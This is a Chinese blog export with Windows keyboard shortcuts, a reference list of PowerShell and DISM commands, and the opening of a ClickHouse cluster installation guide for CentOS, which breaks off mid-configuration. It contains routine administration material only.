<td>永久删除（不经过回收站）</td>
</tr>
<tr>
<td>Ctrl + S</td>
<td>保存当前文档或文件</td>
</tr>
<tr>
<td>Ctrl + P</td>
<td>打印当前文档</td>
</tr>
<tr>
<td>Ctrl + O</td>
<td>打开文件</td>
</tr>
<tr>
<td>Ctrl + N</td>
<td>新建文件或窗口</td>
</tr>
<tr>
<td>Home &#x2F; End</td>
<td>将光标移动到行首 &#x2F; 行尾</td>
</tr>
<tr>
<td>Ctrl + Home &#x2F; Ctrl + End</td>
<td>将光标移动到文档开头 &#x2F; 文档末尾</td>
</tr>
<tr>
<td>Ctrl + ← &#x2F; Ctrl + →</td>
<td>按单词向左&#x2F;向右移动光标</td>
</tr>
<tr>
<td>Ctrl + Backspace &#x2F; Ctrl + Delete</td>
<td>删除光标前&#x2F;后的一个单词</td>
</tr>
<tr>
<td>Shift + 方向键</td>
<td>选中文本 (可结合 Ctrl 选中单词或段落)</td>
</tr>
</tbody></table>
<h3 id="窗口管理"><a href="#窗口管理" class="headerlink" title="窗口管理"></a>窗口管理</h3><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Alt + Tab</td>
<td>切换打开的程序窗口</td>
</tr>
<tr>
<td>Win + Tab</td>
<td>打开任务视图（虚拟桌面管理）</td>
</tr>
<tr>
<td>Win + ←&#x2F;→</td>
<td>将窗口贴靠到屏幕左&#x2F;右侧（分屏）</td>
</tr>
<tr>
<td>Win + ↑&#x2F;↓</td>
<td>最大化&#x2F;最小化当前窗口</td>
</tr>
<tr>
<td>Win + D</td>
<td>显示桌面（最小化所有窗口）</td>
</tr>
<tr>
<td>Win + M</td>
<td>最小化所有窗口</td>
</tr>
<tr>
<td>Win + Shift + M</td>
<td>还原最小化的窗口</td>
</tr>
<tr>
<td>Alt + F4</td>
<td>关闭当前窗口或程序</td>
</tr>
<tr>
<td>Win + Ctrl + D</td>
<td>创建新的虚拟桌面</td>
</tr>
<tr>
<td>Win + Ctrl + ← &#x2F; Win + Ctrl + →</td>
<td>在虚拟桌面之间切换</td>
</tr>
<tr>
<td>Win + Ctrl + F4</td>
<td>关闭当前虚拟桌面</td>
</tr>
</tbody></table>
<h3 id="文件资源管理器"><a href="#文件资源管理器" class="headerlink" title="文件资源管理器"></a>文件资源管理器</h3><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Win + E</td>
<td>打开文件资源管理器</td>
</tr>
<tr>
<td>Ctrl + Shift + N</td>
<td>新建文件夹</td>
</tr>
<tr>
<td>F2</td>
<td>重命名选中文件&#x2F;文件夹</td>
</tr>
<tr>
<td>F3</td>
<td>在资源管理器中搜索</td>
</tr>
<tr>
<td>Alt + Enter</td>
<td>显示选中文件的属性</td>
</tr>
</tbody></table>
<h3 id="系统快捷操作"><a href="#系统快捷操作" class="headerlink" title="系统快捷操作"></a>系统快捷操作</h3><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Win + L</td>
<td>锁定电脑</td>
</tr>
<tr>
<td>Win + E</td>
<td>打开「文件资源管理器」</td>
</tr>
<tr>
<td>Win + I</td>
<td>打开「设置」应用</td>
</tr>
<tr>
<td>Win + R</td>
<td>打开“运行”对话框</td>
</tr>
<tr>
<td>Win + I</td>
<td>打开系统设置</td>
</tr>
<tr>
<td>Win + A</td>
<td>打开「通知中心」&#x2F;「操作中心」</td>
</tr>
<tr>
<td>Win + X</td>
<td>打开「高级用户菜单」</td>
</tr>
<tr>
<td>Win + S</td>
<td>打开搜索栏（全局搜索）</td>
</tr>
<tr>
<td>Win + P</td>
<td>切换投影模式（多显示器）</td>
</tr>
<tr>
<td>Win + Tab</td>
<td>打开「任务视图」 (查看所有窗口和虚拟桌面)</td>
</tr>
<tr>
<td>Win + Pause&#x2F;Break</td>
<td>快速打开「系统属性」</td>
</tr>
<tr>
<td>Ctrl + Shift + Esc</td>
<td>直接打开任务管理器</td>
</tr>
<tr>
<td>Win + X</td>
<td>打开高级用户菜单（快速访问工具）</td>
</tr>
</tbody></table>
<h3 id="浏览器-文本编辑"><a href="#浏览器-文本编辑" class="headerlink" title="浏览器 &amp; 文本编辑"></a>浏览器 &amp; 文本编辑</h3><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Ctrl + T</td>
<td>新建浏览器标签页</td>
</tr>
<tr>
<td>Ctrl + N</td>
<td>打开新的资源管理器窗口</td>
</tr>
<tr>
<td>Ctrl + W</td>
<td>关闭当前资源管理器窗口或标签页</td>
</tr>
<tr>
<td>Ctrl + E</td>
<td>将光标定位到地址栏或搜索框</td>
</tr>
<tr>
<td>Ctrl + Shift + T</td>
<td>恢复刚关闭的标签页</td>
</tr>
<tr>
<td>Ctrl + F</td>
<td>页面内查找</td>
</tr>
<tr>
<td>Alt + D</td>
<td>定位到地址栏并选中路径</td>
</tr>
<tr>
<td>F5 &#x2F; Ctrl + R</td>
<td>刷新页面</td>
</tr>
<tr>
<td>Ctrl + Home&#x2F;End</td>
<td>跳转到文档开头&#x2F;结尾</td>
</tr>
<tr>
<td>Ctrl + Shift + ←&#x2F;→</td>
<td>按单词选中文本</td>
</tr>
<tr>
<td>Ctrl + F5 &#x2F; Ctrl + Shift + R</td>
<td>强制刷新</td>
</tr>
<tr>
<td>Ctrl + D</td>
<td>将当前网页添加到收藏夹&#x2F;书签</td>
</tr>
<tr>
<td>Ctrl + H</td>
<td>打开历史记录</td>
</tr>
<tr>
<td>Ctrl + J</td>
<td>打开下载列表</td>
</tr>
</tbody></table>
<h3 id="其他实用快捷键"><a href="#其他实用快捷键" class="headerlink" title="其他实用快捷键"></a>其他实用快捷键</h3><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Print Screen</td>
<td>截取全屏（保存到剪贴板）</td>
</tr>
<tr>
<td>Win + Print Screen</td>
<td>截屏并自动保存到“图片”文件夹</td>
</tr>
<tr>
<td>Win + Shift + S</td>
<td>区域截图（支持矩形&#x2F;自由形状）</td>
</tr>
<tr>
<td>Win + V</td>
<td>打开剪贴板历史记录（需启用）</td>
</tr>
<tr>
<td>Win + .</td>
<td>打开表情符号面板</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Window</category>
      </categories>
      <tags>
        <tag>Window</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows总结二【PowerShell实用命令】</title>
    <url>/cnblogs.github.io/p/54270.html</url>
    <content><![CDATA[<h4 id="系统信息相关"><a href="#系统信息相关" class="headerlink" title="系统信息相关"></a>系统信息相关</h4><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Get-ComputerInfo</td>
<td>查看主机详细信息</td>
</tr>
<tr>
<td>Get-Host</td>
<td>显示当前 PowerShell 主机版本</td>
</tr>
<tr>
<td>systeminfo</td>
<td>查看系统基本信息（CMD兼容）</td>
</tr>
<tr>
<td>Get-Uptime</td>
<td>查看系统运行时长</td>
</tr>
<tr>
<td>Get-WmiObject -Class Win32_OperatingSystem</td>
<td>查看系统版本和安装日期</td>
</tr>
</tbody></table>
<h4 id="文件与目录操作"><a href="#文件与目录操作" class="headerlink" title="文件与目录操作"></a>文件与目录操作</h4><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Get-ChildItem 或 ls</td>
<td>列出当前目录内容</td>
</tr>
<tr>
<td>cd &lt;路径&gt;</td>
<td>进入目录</td>
</tr>
<tr>
<td>Copy-Item A.txt B.txt</td>
<td>复制文件</td>
</tr>
<tr>
<td>Move-Item A.txt D:\</td>
<td>移动文件</td>
</tr>
<tr>
<td>Remove-Item A.txt</td>
<td>删除文件</td>
</tr>
<tr>
<td>New-Item -ItemType File test.txt</td>
<td>新建文件</td>
</tr>
<tr>
<td>New-Item -ItemType Directory MyFolder</td>
<td>新建目录</td>
</tr>
<tr>
<td>Clear-Content A.txt</td>
<td>清空文件内容</td>
</tr>
<tr>
<td>Get-Content A.txt</td>
<td>读取文件内容</td>
</tr>
<tr>
<td>Set-Content A.txt “Hello”</td>
<td>写入文本到文件</td>
</tr>
</tbody></table>
<h4 id="搜索与过滤"><a href="#搜索与过滤" class="headerlink" title="搜索与过滤"></a>搜索与过滤</h4><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Select-String -Path *.log -Pattern “error”</td>
<td>搜索日志中的关键词</td>
</tr>
<tr>
<td>&#96;Get-ChildItem -Recurse</td>
<td>Where-Object {$_.Name -like “2025”}&#96;</td>
</tr>
<tr>
<td>&#96;Get-Process</td>
<td>Sort-Object CPU -Descending</td>
</tr>
</tbody></table>
<h4 id="进程与服务管理"><a href="#进程与服务管理" class="headerlink" title="进程与服务管理"></a>进程与服务管理</h4><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Get-Process</td>
<td>查看当前运行进程</td>
</tr>
<tr>
<td>Stop-Process -Name notepad</td>
<td>结束指定进程</td>
</tr>
<tr>
<td>Start-Process notepad.exe</td>
<td>启动进程</td>
</tr>
<tr>
<td>Get-Service</td>
<td>查看系统服务</td>
</tr>
<tr>
<td>Start-Service wuauserv</td>
<td>启动服务</td>
</tr>
<tr>
<td>Stop-Service Spooler</td>
<td>停止服务</td>
</tr>
<tr>
<td>Restart-Service Spooler</td>
<td>重启服务</td>
</tr>
<tr>
<td>Set-Service -Name Spooler -StartupType Automatic</td>
<td>设置服务启动类型</td>
</tr>
</tbody></table>
<h4 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h4><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Test-Connection <a href="http://www.baidu.com/">www.baidu.com</a></td>
<td>测试网络连通性</td>
</tr>
<tr>
<td>Resolve-DnsName <a href="http://www.baidu.com/">www.baidu.com</a></td>
<td>DNS解析查询</td>
</tr>
<tr>
<td>Get-NetIPAddress</td>
<td>查看本机IP信息</td>
</tr>
<tr>
<td>Get-NetRoute</td>
<td>查看路由表</td>
</tr>
<tr>
<td>Get-NetTCPConnection</td>
<td>查看当前TCP连接</td>
</tr>
<tr>
<td>Get-NetAdapter</td>
<td>查看网卡信息</td>
</tr>
<tr>
<td>Restart-NetAdapter -Name “Ethernet”</td>
<td>重启网卡</td>
</tr>
<tr>
<td>netstat -an</td>
<td>端口监听状态（CMD兼容）</td>
</tr>
</tbody></table>
<h4 id="用户与权限"><a href="#用户与权限" class="headerlink" title="用户与权限"></a>用户与权限</h4><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Get-LocalUser</td>
<td>查看本地用户</td>
</tr>
<tr>
<td>New-LocalUser -Name user1 -Password (Read-Host -AsSecureString)</td>
<td>新建用户</td>
</tr>
<tr>
<td>Add-LocalGroupMember -Group Administrators -Member user1</td>
<td>添加用户到管理员组</td>
</tr>
<tr>
<td>Remove-LocalUser -Name user1</td>
<td>删除用户</td>
</tr>
</tbody></table>
<h4 id="安全与权限相关"><a href="#安全与权限相关" class="headerlink" title="安全与权限相关"></a>安全与权限相关</h4><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Get-Acl .\file.txt</td>
<td>查看权限</td>
</tr>
<tr>
<td>Set-Acl</td>
<td>设置文件或文件夹权限</td>
</tr>
<tr>
<td>Enable-PSRemoting -Force</td>
<td>启用远程管理功能</td>
</tr>
<tr>
<td>Set-ExecutionPolicy RemoteSigned</td>
<td>设置脚本执行权限</td>
</tr>
</tbody></table>
<h4 id="模块与软件包管理"><a href="#模块与软件包管理" class="headerlink" title="模块与软件包管理"></a>模块与软件包管理</h4><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Get-InstalledModule</td>
<td>查看已安装模块</td>
</tr>
<tr>
<td>Install-Module -Name Az</td>
<td>安装PowerShell模块</td>
</tr>
<tr>
<td>Import-Module Az</td>
<td>导入模块</td>
</tr>
<tr>
<td>Update-Module</td>
<td>更新模块</td>
</tr>
<tr>
<td>Uninstall-Module Az</td>
<td>卸载模块</td>
</tr>
</tbody></table>
<h4 id="计划任务与自动化"><a href="#计划任务与自动化" class="headerlink" title="计划任务与自动化"></a>计划任务与自动化</h4><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Get-ScheduledTask</td>
<td>查看所有计划任务</td>
</tr>
<tr>
<td>Register-ScheduledTask</td>
<td>注册新任务（较复杂）</td>
</tr>
<tr>
<td>schtasks &#x2F;create</td>
<td>使用命令创建任务（兼容CMD）</td>
</tr>
<tr>
<td>Start-ScheduledTask -TaskName “MyTask”</td>
<td>运行计划任务</td>
</tr>
<tr>
<td>Unregister-ScheduledTask -TaskName “MyTask” -Confirm:$false</td>
<td>删除任务</td>
</tr>
</tbody></table>
<h4 id="实用技巧与快捷命令"><a href="#实用技巧与快捷命令" class="headerlink" title="实用技巧与快捷命令"></a>实用技巧与快捷命令</h4><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Get-Command</td>
<td>查看所有命令</td>
</tr>
<tr>
<td>Get-Help Get-Process</td>
<td>查看命令帮助</td>
</tr>
<tr>
<td>Get-Help Get-Process -Examples</td>
<td>查看使用示例</td>
</tr>
<tr>
<td>Start-Sleep -Seconds 5</td>
<td>暂停脚本</td>
</tr>
<tr>
<td>Measure-Command {command}</td>
<td>统计命令执行时间</td>
</tr>
<tr>
<td>Out-File log.txt</td>
<td>将输出写入文件</td>
</tr>
</tbody></table>
<h4 id="DISM命令"><a href="#DISM命令" class="headerlink" title="DISM命令"></a>DISM命令</h4><h5 id="基础查询命令（系统状态）"><a href="#基础查询命令（系统状态）" class="headerlink" title="基础查询命令（系统状态）"></a>基础查询命令（系统状态）</h5><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>dism &#x2F;Online &#x2F;Cleanup-Image &#x2F;CheckHealth</td>
<td>查看当前系统映像健康状态</td>
</tr>
<tr>
<td>dism &#x2F;Online &#x2F;Cleanup-Image &#x2F;ScanHealth</td>
<td>更深入检查映像是否可修复</td>
</tr>
<tr>
<td>dism &#x2F;Online &#x2F;Cleanup-Image &#x2F;RestoreHealth</td>
<td>修复映像（联网状态建议使用）</td>
</tr>
</tbody></table>
<h5 id="驱动程序操作"><a href="#驱动程序操作" class="headerlink" title="驱动程序操作"></a>驱动程序操作</h5><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>dism &#x2F;Online &#x2F;Get-Drivers</td>
<td>列出驱动程序</td>
</tr>
<tr>
<td>dism &#x2F;Online &#x2F;Export-Driver &#x2F;Destination:D:\Drivers</td>
<td>导出所有驱动</td>
</tr>
<tr>
<td>dism &#x2F;Online &#x2F;Add-Driver &#x2F;Driver:”C:\MyDriver\driver.inf”</td>
<td>添加一个驱动</td>
</tr>
<tr>
<td>dism &#x2F;Online &#x2F;Remove-Driver &#x2F;Driver:oem25.inf</td>
<td>删除驱动（根据 published name）</td>
</tr>
</tbody></table>
<h5 id="功能组件管理（Feature）"><a href="#功能组件管理（Feature）" class="headerlink" title="功能组件管理（Feature）"></a>功能组件管理（Feature）</h5><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>dism &#x2F;Online &#x2F;Get-Features</td>
<td>查看所有可用功能</td>
</tr>
<tr>
<td>dism &#x2F;Online &#x2F;Enable-Feature &#x2F;FeatureName:NetFx3 &#x2F;All</td>
<td>启用 .NET Framework 3.5</td>
</tr>
<tr>
<td>dism &#x2F;Online &#x2F;Disable-Feature &#x2F;FeatureName:MediaPlayback</td>
<td>禁用某功能</td>
</tr>
</tbody></table>
<h5 id="软件包管理（Package）"><a href="#软件包管理（Package）" class="headerlink" title="软件包管理（Package）"></a>软件包管理（Package）</h5><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>dism &#x2F;Online &#x2F;Get-Packages</td>
<td>查看已安装的补丁包</td>
</tr>
<tr>
<td>dism &#x2F;Online &#x2F;Add-Package &#x2F;PackagePath:”C:\update\KB5005463.cab”</td>
<td>安装 .cab 补丁包</td>
</tr>
<tr>
<td>dism &#x2F;Online &#x2F;Remove-Package &#x2F;PackageName:Package_for_KB5005463<del>31bf3856ad364e35</del>amd64~~10.0.1.0</td>
<td>卸载某个包（补丁）</td>
</tr>
</tbody></table>
<h5 id="映像文件操作（WIM）"><a href="#映像文件操作（WIM）" class="headerlink" title="映像文件操作（WIM）"></a>映像文件操作（WIM）</h5><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>dism &#x2F;Mount-Wim &#x2F;WimFile:D:\install.wim &#x2F;index:1 &#x2F;MountDir:D:\Mount</td>
<td>挂载WIM镜像</td>
</tr>
<tr>
<td>dism &#x2F;Unmount-Wim &#x2F;MountDir:D:\Mount &#x2F;Commit</td>
<td>卸载并保存改动</td>
</tr>
<tr>
<td>dism &#x2F;Unmount-Wim &#x2F;MountDir:D:\Mount &#x2F;Discard</td>
<td>卸载并放弃改动</td>
</tr>
</tbody></table>
<h5 id="系统语言与区域设置"><a href="#系统语言与区域设置" class="headerlink" title="系统语言与区域设置"></a>系统语言与区域设置</h5><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>dism &#x2F;Online &#x2F;Get-Intl</td>
<td>显示已安装语言</td>
</tr>
<tr>
<td>dism &#x2F;Online &#x2F;Set-AllIntl:zh-CN</td>
<td>设置系统语言为中文简体</td>
</tr>
</tbody></table>
<h5 id="清理与优化命令"><a href="#清理与优化命令" class="headerlink" title="清理与优化命令"></a>清理与优化命令</h5><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>dism &#x2F;Online &#x2F;Cleanup-Image &#x2F;StartComponentCleanup</td>
<td>清理 superseded files</td>
</tr>
<tr>
<td>dism &#x2F;Online &#x2F;Cleanup-Image &#x2F;StartComponentCleanup &#x2F;ResetBase</td>
<td>删除备份文件，无法卸载旧补丁</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Window</category>
      </categories>
      <tags>
        <tag>Window</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS安装软件一【ClickHouse集群搭建】</title>
    <url>/cnblogs.github.io/p/64832.html</url>
    <content><![CDATA[<p>ClickHouse数据库的特点：</p>
<ul>
<li>速度快ClickHouse性能超过了市面上大部分的列式存储数据库，相比传统的数据ClickHouse要快100-1000倍，ClickHouse还是有非常大的优势。1亿数据集:ClickHouse比Vertica约快5倍，比Hive快279倍，比MySQL快801倍。10亿数据集:ClickHouse比Vertica约快5倍，MySQL和Hive已经无法完成任务了。</li>
<li>功能多1.支持类SQL查询；2.支持繁多库函数（例如IP转化，URL分析等，预估计算&#x2F;HyperLoglog等）；3.支持数组(Array)和嵌套数据结构(Nested Data Structure)；4.支持数据库异地复制部署。</li>
</ul>
<p>要注意，由于ClickHouse的快速查询还是基于系统资源的，因此在使用的时候要注意每个节点上的存储量，以及节点机器的系统资源要充足。因为查询时是使用内存进行聚合，所以同时并发查询的数量不能太多，否则就会造成资源崩溃。</p>
<h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><table>
<thead>
<tr>
<th>IP</th>
<th>hostname</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.143.20</td>
<td>node1</td>
</tr>
<tr>
<td>192.168.143.21</td>
<td>node2</td>
</tr>
<tr>
<td>192.168.143.22</td>
<td>node3</td>
</tr>
</tbody></table>
<h3 id="初始化环境（所有节点）"><a href="#初始化环境（所有节点）" class="headerlink" title="初始化环境（所有节点）"></a>初始化环境（所有节点）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改机器的hostname</span></span><br><span class="line">vi /etc/hostname</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置hosts</span></span><br><span class="line">vi /etc/hosts</span><br><span class="line"></span><br><span class="line">192.168.143.20 node1</span><br><span class="line">192.168.143.21 node2</span><br><span class="line">192.168.143.22 node3</span><br></pre></td></tr></table></figure>
<p>修改完后，执行hostname node1…3，不用重启机器使其生效</p>
<h3 id="下载并安装ClickHouse（所有节点）"><a href="#下载并安装ClickHouse（所有节点）" class="headerlink" title="下载并安装ClickHouse（所有节点）"></a>下载并安装ClickHouse（所有节点）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://repo.yandex.ru/clickhouse/rpm/stable/clickhouse-client-24.3.11.7.x86_64.rpm</span><br><span class="line">wget https://repo.yandex.ru/clickhouse/rpm/stable/clickhouse-common-static-24.3.11.7.x86_64.rpm</span><br><span class="line">wget https://repo.yandex.ru/clickhouse/rpm/stable/clickhouse-server-24.3.11.7.x86_64.rpm</span><br><span class="line">wget https://repo.yandex.ru/clickhouse/rpm/stable/clickhouse-server-common-24.3.11.7.x86_64.rpm</span><br><span class="line"></span><br><span class="line">rpm -ivh *.rpm</span><br></pre></td></tr></table></figure>

<h3 id="安装-zookeeper（任意一个节点）"><a href="#安装-zookeeper（任意一个节点）" class="headerlink" title="安装 zookeeper（任意一个节点）"></a>安装 zookeeper（任意一个节点）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">我这里选择node1</span></span><br><span class="line">docker run -d --net host --name zookeeper zookeeper</span><br></pre></td></tr></table></figure>

<h3 id="配置集群（所有节点）"><a href="#配置集群（所有节点）" class="headerlink" title="配置集群（所有节点）"></a>配置集群（所有节点）</h3><ul>
<li>修改&#x2F;etc&#x2F;clickhouse-server&#x2F;config.xml<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 将下面行注释去掉 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">listen_host</span>&gt;</span>::<span class="tag">&lt;/<span class="name">listen_host</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 修改默认数据存储目录，比如在/home下创建目录clickhouse --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">path</span>&gt;</span>/var/lib/clickhouse/<span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 修改为如下 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">path</span>&gt;</span>/home/clickhouse/<span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>修改&#x2F;etc&#x2F;clickhouse-server&#x2F;users.xml<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 配置查询使用的内存，根据机器资源进行配置 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">max_memory_usage</span>&gt;</span>5000000000000<span class="tag">&lt;/<span class="name">max_memory_usage</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 在&lt;/users&gt;前面增加用户配置 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 通过Linux命令计算出密码的sha256加密值 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">password_sha256_hex</span>&gt;</span>xxxx...xxxx<span class="tag">&lt;/<span class="name">password_sha256_hex</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">networks</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ip</span>&gt;</span>::/0<span class="tag">&lt;/<span class="name">ip</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">networks</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">profile</span>&gt;</span>default<span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">quota</span>&gt;</span>default<span class="tag">&lt;/<span class="name">quota</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>增加配置文件&#x2F;etc&#x2F;metrika.xml<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">yandex</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- ck集群节点 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">clickhouse_remote_servers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test_cluster</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">shard</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">internal_replication</span>&gt;</span>true<span class="tag">&lt;/<span class="name">internal_replication</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">replica</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">host</span>&gt;</span>node1<span class="tag">&lt;/<span class="name">host</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">port</span>&gt;</span>9000<span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">user</span>&gt;</span>root<span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">replica</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">shard</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">shard</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">internal_replication</span>&gt;</span>true<span class="tag">&lt;/<span class="name">internal_replication</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">replica</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">host</span>&gt;</span>node2<span class="tag">&lt;/<span class="name">host</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">port</span>&gt;</span>9000<span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">user</span>&gt;</span>root<span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">replica</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">shard</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">shard</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">internal_replication</span>&gt;</span>true<span class="tag">&lt;/<span class="name">internal_replication</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">replica</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">host</span>&gt;</span>node3<span class="tag">&lt;/<span class="name">host</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">port</span>&gt;</span>9000<span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">user</span>&gt;</span>root<span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">replica</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">shard</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">test_cluster</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- zookeeper相关配置--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">zookeeper-servers</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">node</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">host</span>&gt;</span>node1<span class="tag">&lt;/<span class="name">host</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">port</span>&gt;</span>2181<span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">node</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">zookeeper-servers</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">networks</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ip</span>&gt;</span>::/0<span class="tag">&lt;/<span class="name">ip</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">networks</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">macros</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">replica</span>&gt;</span>node1<span class="tag">&lt;/<span class="name">replica</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">macros</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 压缩相关配置 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">clickhouse_compression</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span 